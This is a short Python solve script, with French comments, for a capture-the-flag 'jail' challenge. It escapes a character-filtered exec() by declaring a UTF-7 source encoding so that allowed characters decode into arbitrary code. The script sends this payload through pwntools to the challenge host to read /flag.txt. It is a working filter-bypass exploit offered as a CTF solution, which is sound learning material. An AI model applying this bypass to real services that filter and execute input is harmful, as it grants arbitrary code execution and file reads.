#!/usr/bin/env python3
# Theory of Everything (Pwny-CTF, Jail)
#
# Filtre : seuls a-zA-Z0-9, whitespace, +-*/= et # sont autorises, puis
#   exec(user_input.encode(), {"e":.., "pi":..}, {})
# Pas de (), guillemets, points, underscores... DANS l'input brut. Astuce :
# declaration d'encodage source. "#coding=utf-7" (PEP 263 accepte '=' en plus
# de ':') fait decoder le RESTE du source en UTF-7. Un bloc UTF-7 "+<base64>-"
# n'emploie que des caracteres autorises (base64 = A-Za-z0-9+/, debut '+', fin
# '-') et decode vers du Python arbitraire -> on y met print(open("/flag.txt")).
#
# input() ne lit qu'UNE ligne : on separe la ligne coding du corps par '\r'
# (retour chariot), qui est un separateur de ligne pour le tokenizer Python,
# est dans string.whitespace (donc autorise), et n'arrete pas input().
from pwn import *
import base64

P = 'print(open("/flag.txt").read())'
body = b"+" + base64.b64encode(P.encode("utf-16-be")).rstrip(b"=") + b"-"
payload = b"#coding=utf-7\r" + body       # une seule "ligne" pour input()

io = remote("chal.sigpwny.com", 7005)
io.sendlineafter(b"-------\n", payload)
print(io.recvall(timeout=5).decode(errors="replace"))
